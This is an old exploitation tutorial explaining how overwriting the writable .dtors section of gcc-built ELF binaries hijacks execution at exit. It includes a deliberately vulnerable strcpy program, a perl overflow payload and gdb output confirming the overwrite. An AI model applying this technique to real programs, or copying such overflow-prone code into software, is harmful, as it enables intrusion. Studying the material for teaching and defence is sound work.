@@ -1,0 +1,291 @@
+-------------------------------------------------------------------------------
+
+                        Overwriting the .dtors section.
+
+                by Juan M. Bello Rivas <rwxrwxrwx@synnergy.net>
+
+-------------------------------------------------------------------------------
+
+Introduction
+------------
+
+        This paper presents a concise explanation of a technique to gain
+control of a C program's flow of execution given that it has been compiled with
+gcc. This text assumes that the reader is familiar with general overflow
+techniques and the ELF format.
+
+Thanks
+------
+
+        ga and dvorak for interesting discussion.
+
+Overview
+--------
+
+        gcc provides several types of attributes for functions, particularly
+there are two which will be of special interest for us: constructors and
+destructors. These attributes should be specified by the programmer in a way
+similar to this:
+
+             static void start(void) __attribute__ ((constructor));
+              static void stop(void) __attribute__ ((destructor));
+
+        Functions with the `constructor' attribute will be executed before
+main() while those declared with the `destructor' attribute will be executed
+just _after_ main() exits.
+        In the produced ELF executable image this will be represented as two
+different sections: .ctors and .dtors. Both of them will have the following
+layout:
+
+    0xffffffff <function address> <another function address> ... 0x00000000
+
+        NOTE: If you want to really know everything about this I recommend you
+to launch your favourite editor on gcc-2.95.2/gcc/collect2.c
+
+        From this point there are several things to take into account:
+
+        * .ctors and .dtors will be mapped in memory in the process' address
+space and will be writable by default.
+        * These sections won't go away after a normal strip(1) of the binary.
+        * We don't care whether the programmer has set up any function as
+either a constructor or destructor because both sections will appear anyway and
+be mapped in memory.
+
+The gory details
+----------------
+
+        It's perhaps time to demonstrate the previous statements. There we
+go...
+
+$ cat > yopta.c <<EOF
+#include <stdio.h>
+#include <stdlib.h>
+
+static void start(void) __attribute__ ((constructor));
+static void stop(void) __attribute__ ((destructor));
+
+int
+main(int argc, char *argv[])
+{
+        printf("start == %p\n", start);
+        printf("stop == %p\n", stop);
+
+        exit(EXIT_SUCCESS);
+}
+
+void
+start(void)
+{
+        printf("hello world!\n");
+}
+
+void
+stop(void)
+{
+        printf("goodbye world!\n");
+}
+
+EOF
+$ gcc -o yopta yopta.c
+$ ./yopta
+hello world!
+start == 0x8048480
+stop == 0x80484a0
+goodbye world!
+$ objdump -h yopta
+                                       .
+                                       .
+                                       .
+ 14 .data         0000000c  08049558  08049558  00000558  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 15 .eh_frame     00000004  08049564  08049564  00000564  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 16 .ctors        0000000c  08049568  08049568  00000568  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 17 .dtors        0000000c  08049574  08049574  00000574  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 18 .got          00000024  08049580  08049580  00000580  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+                                       .
+                                       .
+                                       .
+$ objdump -s -j .dtors yopta
+
+yopta:     file format elf32-i386
+
+Contents of section .dtors:
+ 8049574 ffffffff a0840408 00000000           ............
+
+        As we can see the address of stop() is stored in the .dtors as it was
+previously said. Our aim here is the exploitation of a program, thus we will
+forget from now on about .ctors since we'll not be able to do anything useful
+with it.
+
+        We'll try now with a normal program without these function attributes:
+
+$ cat > bleh.c <<EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+static void bleh(void);
+
+int
+main(int argc, char *argv[])
+{
+        static u_char buf[] = "bleh";
+
+        if (argc < 2)
+                exit(EXIT_FAILURE);
+
+        strcpy(buf, argv[1]);
+
+        exit(EXIT_SUCCESS);
+}
+
+void
+bleh(void)
+{
+        printf("goffio!\n");
+}
+EOF
+$ gcc -o bleh bleh.c
+$ ./bleh
+$ objdump -h bleh
+                                       .
+                                       .
+                                       .
+ 17 .dtors        00000008  0804955c  0804955c  0000055c  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+                                       .
+                                       .
+                                       .
+
+        Good! .dtors is still there even when there are no functions flagged as
+destructors. Now we take a look at its contents:
+
+$ objdump -s -j .dtors bleh
+
+bleh:     file format elf32-i386
+
+Contents of section .dtors:
+ 804955c ffffffff 00000000                    ........
+
+        Only the head and tail tags are present but there are no function
+addresses specified.
+
+        Maybe it seems odd to see buf declared as both static and initialized.
+By doing so we make it be stored in the .data section which is very near to
+our target .dtors section. Thus we'll be able to reach our objective easily by
+overflowing buf. This is not the only avenue we can take to write into that
+place, virtually every method you can come up with to write into the process'
+address space will be useful (format string attack, direct strcpy by returning
+into libc, corrupting a malloc chunk, ...) The one used here was chosen due to
+its simplicity.
+
+        The goal now is to be able to execute the code present in bleh() (which
+never gets called under normal conditions) by making an entry in .dtors that
+points to it. We must leave the head tag alone and overwrite the tail tag (the
+0x00000000) to achieve it.
+
+$ objdump --syms bleh | egrep 'text.*bleh'
+080484b0 l     F .text  0000001a              bleh
+
+        So as we can see bleh() is placed at 0x080484b0. It's time for an
+exploit.
+
+$ ./bleh `perl -e 'print "A" x 24; print "\xb0\x84\x04\x08";'`
+goffio!
+Segmentation fault (core dumped)
+
+        The test worked as we expected, but perhaps it is better to double
+check and see the corpse of our process and what was changed.
+
+$ gdb bleh core
+GNU gdb 5.0
+Copyright 2000 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu"...
+Core was generated by `./bleh AAAAAAAAAAAAAAAAAAAAAAAA°
+                                                      '.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols from /lib/libc.so.6...done.
+Loaded symbols for /lib/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+#0  0x40013ed8 in ?? ()
+(gdb) bt
+#0  0x40013ed8 in ?? ()
+#1  0x8048521 in _fini ()
+#2  0x4003c25a in exit (status=0) at exit.c:57
+#3  0x80484a3 in main ()
+#4  0x400339cb in __libc_start_main (main=0x8048460 <main>, argc=2, argv=0xbfff
+f8a4, init=0x80482e0 <_init>,
+    fini=0x804850c <_fini>, rtld_fini=0x4000ae60 <_dl_fini>, stack_end=0xbffff8
+9c) at ../sysdeps/generic/libc-start.c:92
+(gdb) maintenance info sections
+Exec file:
+    `/home/rwx/tmp/bleh', file type elf32-i386.
+                                       .
+                                       .
+                                       .
+    0x0804953c->0x08049550 at 0x0000053c: .data ALLOC LOAD DATA HAS_CONTENTS
+    0x08049550->0x08049554 at 0x00000550: .eh_frame ALLOC LOAD DATA HAS_CONTENTS
+    0x08049554->0x0804955c at 0x00000554: .ctors ALLOC LOAD DATA HAS_CONTENTS
+    0x0804955c->0x08049564 at 0x0000055c: .dtors ALLOC LOAD DATA HAS_CONTENTS
+    0x08049564->0x0804958c at 0x00000564: .got ALLOC LOAD DATA HAS_CONTENTS
+                                       .
+                                       .
+                                       .
+
+        Now we want to examine what was overwritten.
+
+(gdb) x/x 0x08049550
+0x8049550 <force_to_data>:      0x41414141
+
+        These are the contents of the .eh_frame (used by gcc to store the
+exception handler pointers for languages that support them).
+
+(gdb) x/x 0x08049554
+0x8049554 <__CTOR_LIST__>:      0x41414141
+(gdb) x/8x 0x0804955c
+0x804955c <__DTOR_LIST__>:      0x41414141      0x080484b0      0x08049500     
+ 0x40013ed0
+0x804956c <_GLOBAL_OFFSET_TABLE_+8>:    0x4000a960      0x400fb550      0x08048
+336      0x400338cc
+(gdb)
+
+        As we can see, we didn't take any care as to place the 0xfffffff head
+tag in it's appropriate place and it turned out not to be needed at all, just
+by putting bleh()'s address into the right position we made the code be
+executed.  We can also notice that the process segfaults after _fini(), this is
+obviously because it keeps searching for the non-existent tail tag (0x00000000)
+and jumping into every address just after ours (those found in the Global
+Offset Table). 
+
+Conclusion
+----------
+
+        An alternative way to launch an injected piece of shellcode has been
+shown. The technique provides some advantages:
+
+        * If the target binary is readable by the attacker it will be very
+easy to determine the exact position where we want to write and point to our
+shellcode, just by analyzing the ELF image and determining .dtors position will
+be enough. In this circumstance the reliability of the exploit is usually
+drastically increased.
+        * It is simpler than other techniques like overwriting an entry in the
+Global Offset Table.
+
+        ...and disadvantages:
+
+        * Requires that the victim program has been compiled and linked with
+GNU tools.
+        * Under some circumstances it may be difficult to find a place to store
+the shellcode until the program exit()s.
+
+        Have fun! :)
+
